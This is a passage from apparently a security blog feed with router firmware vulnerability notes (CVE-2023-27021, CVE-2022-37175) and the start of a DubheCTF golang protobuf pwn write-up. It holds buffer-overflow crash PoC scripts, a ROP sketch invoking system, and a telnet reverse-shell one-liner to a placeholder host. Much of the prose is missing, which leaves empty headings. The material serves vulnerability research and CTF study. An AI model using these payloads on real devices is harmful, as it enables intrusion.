./ ./bin/httpd</span><br></pre></td></tr></table></figure><p>gdb attach</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gdb-mulitarch</span><br><span class="line">$ file bin/httpd</span><br><span class="line">$ b *0x00079F64</span><br></pre></td></tr></table></figure><p>PoC</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> 0x7a064 &lt;fromAddressNat+256&gt;    bl     <span class="comment">#sprintf@plt                       &lt;sprintf@plt&gt;</span></span><br><span class="line">       s: 0x4080010c  0x0</span><br><span class="line">       format: 0xe6054  <span class="string">&#x27;advance/addressNatList.asp?page=%s&#x27;</span></span><br><span class="line">       vararg: 0x125250  0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure><p>pc </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  0x7a0c8 &lt;fromAddressNat+356&gt;    sub    sp, fp, <span class="comment">#8</span></span><br><span class="line">   0x7a0cc &lt;fromAddressNat+360&gt;    pop    &#123;r4, fp, pc&#125;</span><br><span class="line"></span><br><span class="line">// ...</span><br><span class="line">Invalid address 0x61616160</span><br></pre></td></tr></table></figure><h3 id="CVE-2023-27021"><a href="#CVE-2023-27021" class="headerlink" title="CVE-2023-27021"></a>CVE-2023-27021</h3><p><a href="https://xz.aliyun.com/t/13506?time__1311=mqmxnQiQi=DQ0=GODlcIEHfh+fhfrD&alichlgref=https://cn.bing.com/#toc-5">0dayRCE</a></p><p> <code>formSetFirewallCfg</code></p><p>PoC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.85.131/goform/SetFirewallCfg&quot;</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;password=hamster&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">500</span></span><br><span class="line">data = &#123;<span class="string">&quot;firewallEn&quot;</span>: payload&#125;</span><br><span class="line">resp = requests.post(url, headers=header, data=data, timeout=<span class="number">5</span>)</span><br><span class="line">resp = requests.post(url, headers=header, data=data, timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p>ROP</p><ul><li>libcbase: gdbvmmap</li><li>ROP: </li><li>bin&#x2F;bashtelnetgetshell</li></ul><p>pop pc </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop &#123;r3, pc&#125;</span><br><span class="line">r3_val: system_addr</span><br><span class="line">pc: </span><br><span class="line">mov r0, sp // r0</span><br><span class="line">blx, r3</span><br></pre></td></tr></table></figure><p>telnet shell</p><ul><li>telnetx.x.x.xport1Telnet<code>/bin/bash</code><code>/bin/bash</code><code>telnet</code><code>/bin/bash</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># (x.x.x.xip)</span></span><br><span class="line">$ telnet x.x.x.x 6666 | /bin/bash | telnet x.x.x.x 5555</span><br><span class="line"><span class="comment"># 5555</span></span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><ul><li></li><li></li><li></li></ul><p>httpcve</p><p></p><ul><li></li><li></li></ul><p>strcpy&#x2F;memcpy</p><ul><li>form_fast_setting_wifi_set</li><li>fromSetIpMacBind</li><li>SetSysTimeCfg</li><li>fromSetSysTime</li><li>setSchedWifi</li></ul><p>formWifiBasicSet  <code>V15.03.05.18</code> CVE</p><p><a href="https://www.cnblogs.com/Amalll/p/16527552.html">CVE-2022-37175</a> <code>security_5g</code>  <code>security</code></p><ul><li></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">formWifiBasicSet</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  wrlEn = (<span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;wrlEn&quot;</span>, (<span class="type">int</span>)&amp;byte_EF0B8);</span><br><span class="line">  hideSsid = <span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;hideSsid&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;0&quot;</span>);</span><br><span class="line">  ssid = (<span class="type">int</span>)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;ssid&quot;</span>, (<span class="type">int</span>)&amp;unk_EFE58);</span><br><span class="line">  security = (<span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;security&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;none&quot;</span>);</span><br><span class="line">  wrlPwd = <span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;wrlPwd&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;12345678&quot;</span>);</span><br><span class="line">  wrlEn_5g = (<span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;wrlEn_5g&quot;</span>, (<span class="type">int</span>)&amp;byte_EF0B8);</span><br><span class="line">  hideSsid_5g = <span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;hideSsid_5g&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;0&quot;</span>);</span><br><span class="line">  ssid_5g = (<span class="type">int</span>)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;ssid_5g&quot;</span>, (<span class="type">int</span>)&amp;unk_EFE58);</span><br><span class="line">  security_5g = (<span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;security_5g&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;none&quot;</span>);</span><br><span class="line">  wrlPwd_5g = <span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;wrlPwd_5g&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;12345678&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !hideSsid || !ssid || !security || !wrlPwd || !hideSsid_5g || !ssid_5g || !security_5g || !wrlPwd_5g )</span><br><span class="line">  &#123;</span><br><span class="line">    v57 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_96;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_9CD24</span>(<span class="string">&quot;wl2g.ssidxx.ssid&quot;</span>, ssid, v48, v47);</span><br><span class="line">    v6 = <span class="built_in">sub_8F234</span>(<span class="string">&quot;wl2g.ssidxx.security&quot;</span>, v48, v47);</span><br><span class="line">    <span class="built_in">GetValue</span>(v6, (<span class="type">char</span> *)v47 + <span class="number">256</span>);</span><br><span class="line">    <span class="built_in">SetValue</span>((<span class="type">int</span>)v47, (<span class="type">int</span>)security);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(security, <span class="string">&quot;wpapsk&quot;</span>) || !<span class="built_in">strcmp</span>(security, <span class="string">&quot;wpa2psk&quot;</span>) || !<span class="built_in">strcmp</span>(security, <span class="string">&quot;wpawpa2psk&quot;</span>) )</span><br><span class="line">      <span class="built_in">SetValue</span>((<span class="type">int</span>)v47, (<span class="type">int</span>)<span class="string">&quot;wpapsk&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">SetValue</span>((<span class="type">int</span>)v47, (<span class="type">int</span>)security);</span><br><span class="line">    <span class="built_in">strcpy</span>(s, security);</span><br><span class="line">    <span class="comment">// buffer overflow  v48  v49 DoS</span></span><br><span class="line">    v7 = <span class="built_in">sub_8F234</span>(<span class="string">&quot;wl2g.ssidxx.wpapsk_type&quot;</span>, v48, v47);   </span><br></pre></td></tr></table></figure><p>crashPoC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">url = <span class="string">b&quot;http://192.168.85.131/login/Auth&quot;</span></span><br><span class="line">vuln = <span class="string">b&quot;http://192.168.85.131/goform/WifiBasicSet/&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#  0xdeadbeef</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x13c</span> + (<span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>) + (<span class="string">&#x27;c&#x27;</span> * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">vuln_data = &#123;</span><br><span class="line">    <span class="string">&quot;security&quot;</span>: payload,</span><br><span class="line">    <span class="string">&quot;hideSsid&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ssid&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;security_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wrlPwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hideSsid_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ssid_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wrlPwd_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vuln_data_5g = &#123;</span><br><span class="line">    <span class="string">&quot;security_5g&quot;</span>: payload,</span><br><span class="line">    <span class="string">&quot;hideSsid&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ssid&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;security&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wrlPwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hideSsid_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ssid_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wrlPwd_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    s = requests.session()</span><br><span class="line">    resp = s.post(url=url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(resp.content)</span><br><span class="line">    resp = s.post(url=vuln, data=vuln_data)</span><br><span class="line">    <span class="built_in">print</span>(resp.content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack_5g</span>():</span><br><span class="line">    s = requests.session()</span><br><span class="line">    resp = s.post(url=url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(resp.content)</span><br><span class="line">    resp = s.post(url=vuln, data=vuln_data_5g)</span><br><span class="line">    <span class="built_in">print</span>(resp.content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">attack()</span><br></pre></td></tr></table></figure><h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p>IDA<a href="https://github.com/Accenture/VulFi">VulFi: IDA Pro plugin for query based searching within the binary useful mainly for vulnerability research</a></p><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/Accenture/VulFi</span><br></pre></td></tr></table></figure><p>ida&#x2F;plugins</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cp</span> vulfi.py vulfi_prototypes.json vulfi_rules.json ~/~/idafree-8.4/plugins</span><br></pre></td></tr></table></figure><p>search <code>VulFi</code> </p><p>alt_names </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RULE NAME&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;alt_names&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;function_name_to_look_for&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;wrappers&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;mark_if&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;High&quot;</span><span class="punctuation">:</span><span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Medium&quot;</span><span class="punctuation">:</span><span class="string">&quot;False&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Low&quot;</span><span class="punctuation">:</span> <span class="string">&quot;False&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IoT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DubheCTF-ggbond</title>
      <link href="/2024/03/20/DubheCTF-ggbond/"/>
      <url>/2024/03/20/DubheCTF-ggbond/</url>
      
        <content type="html"><![CDATA[<blockquote><p>golang pwn</p></blockquote><span id="more"></span><h2 id="ggbond"><a href="#ggbond" class="headerlink" title="ggbond"></a>ggbond</h2><p>golang protobuf grpcgogadget</p><p>protobuf: <a href="https://zhuanlan.zhihu.com/p/436041011">protobuf</a></p><p></p><ul><li><strong>optional</strong>: message </li><li><strong>repeated</strong>: </li></ul><p></p><ul><li>1  15 </li><li>16  2047  message  1  15</li><li>12^29 - 1</li><li>19000 ~ 19999 </li></ul><p>grpcurl<a href="https://github.com/grpc/grpc-go/blob/master/Documentation/server-reflection-tutorial.md">server-reflection-tutorial</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest</span><br><span class="line">$ grpcurl -plaintext 127.0.0.1:1337 list</span><br><span class="line">Failed to list services: server does not support the reflection API</span><br></pre></td></tr></table></figure><p>: <a href="https://grpc.io/docs/languages/go/quickstart/">Quick start | Go | gRPC</a></p><p> <code>go build</code> IDA</p><p><a href="https://scottgold.github.io/2020/11/16/%E9%98%85%E8%AF%BBprotobuf-go%E4%BB%A3%E7%A0%81.html">protobuf Go</a>: proto message  golang struct </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> OrderRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">state         protoimpl.MessageState</span><br><span class="line">sizeCache     protoimpl.SizeCache</span><br><span class="line">unknownFields protoimpl.UnknownFields</span><br><span class="line"></span><br><span class="line"><span class="comment">// proto message</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ggbond5requestresponse</p><p>helloworldservice</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line">option go_package = <span class="string">&quot;google.golang.org/grpc/examples/helloworld/helloworld&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> helloworld;</span><br><span class="line"></span><br><span class="line">service Greeter &#123;</span><br><span class="line">  <span class="comment">// Sends a greeting</span></span><br><span class="line">  rpc SayHello (HelloRequest) returns (HelloReply) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.(*server).SayHello</span></span><br><span class="line">retval_840CC0 __golang main__ptr_server_SayHello</span><br><span class="line"></span><br><span class="line"><span class="comment">// google.golang.org/grpc/examples/helloworld/helloworld._Greeter_SayHello_Handler</span></span><br><span class="line">RTYPE *__golang google_golang_org_grpc_examples_helloworld_helloworld__Greeter_SayHello_Handler</span><br></pre></td></tr></table></figure><p></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main/ggbond._GGBondServer_Handler_Handler</span></span><br><span class="line">RTYPE *__golang main_ggbond__GGBondServer_Handler_Handle</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.(*server).Handler</span></span><br><span class="line">retval_848680 __golang main__ptr_server_Handle</span><br><span class="line"></span><br><span class="line">option go_package = <span class="string">&quot;ggbond&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> ggbond;</span><br><span class="line"></span><br><span class="line">service GGBondServer &#123;</span><br><span class="line">  rpc Handler(Request) returns (Response) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Docker</p><p>py</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. ggbond.proto</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grpc._channel._InactiveRpcError: &lt;_InactiveRpcError of RPC that terminated with:</span><br><span class="line">status = StatusCode.UNIMPLEMENTED</span><br><span class="line">details = <span class="string">&quot;unknown service ggbond.GGBondServer&quot;</span></span><br></pre></td></tr></table></figure><p>service</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p_grpc_UnaryServerInfo-&gt;FullMethod.ptr = <span class="string">&quot;/GGBond.GGBondServer/Handler&quot;</span>;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line">option go_package = <span class="string">&quot;GGBond&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> GGBond;</span><br><span class="line"></span><br><span class="line">service GGBondServer &#123;</span><br><span class="line">  rpc Handler(Request) returns (Response) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message IsRequest &#123;</span><br><span class="line">  <span class="type">uint64</span> tab = <span class="number">1</span>;</span><br><span class="line">  <span class="type">uint64</span> data = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message IsResponse &#123;</span><br><span class="line">  <span class="type">uint64</span> tab = <span class="number">1</span>;</span><br><span class="line">  <span class="type">uint64</span> data = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message Request &#123;</span><br><span class="line">  IsRequest request = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message Response &#123;</span><br><span class="line">  <span class="type">uint64</span> tab = <span class="number">1</span>;</span><br><span class="line">  <span class="type">uint64</span> data = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message WhoamiRequest &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message WhoamiResponse &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RoleChangeRequest &#123;</span><br><span class="line">    <span class="type">uint32</span> role = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RoleChangeResponse &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RepeaterRequest &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RepeaterResponse &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message ErrorResponse &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Request4message?</p><hr><p>WP</p><p>pbtkprotobuf<a href="https://wzt.ac.cn/2023/12/14/protobuf/"> Protobuf </a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python pbtk/extractors/from_binary.py  ./pwn ./ggbond.proto </span><br></pre></td></tr></table></figure><p>proto oneof </p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> GGBond;</span><br><span class="line"></span><br><span class="line"><span class="keyword">option</span> go_package = <span class="string">&quot;./;ggbond&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">service </span><span class="title class_">GGBondServer</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">rpc</span> Handler(Request) <span class="keyword">returns</span> (Response)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Request</span> &#123;</span><br><span class="line">    <span class="keyword">oneof</span> request &#123;</span><br><span class="line">        WhoamiRequest whoami = <span class="number">100</span>;</span><br><span class="line">        RoleChangeRequest role_change = <span class="number">101</span>;</span><br><span class="line">        RepeaterRequest repeater = <span class="number">102</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Response</span> &#123;</span><br><span class="line">    <span class="keyword">oneof</span> response &#123;</span><br><span class="line">        WhoamiResponse whoami = <span class="number">200</span>;</span><br><span class="line">        RoleChangeResponse role_change = <span class="number">201</span>;</span><br><span class="line">        RepeaterResponse repeater = <span class="number">202</span>;</span><br><span class="line">        ErrorResponse error = <span class="number">444</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">WhoamiRequest</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">WhoamiResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RoleChangeRequest</span> &#123;</span><br><span class="line">    <span class="type">uint32</span> role = <span class="number">1001</span>;</span><br><span class="line">&#125;</span><br><span 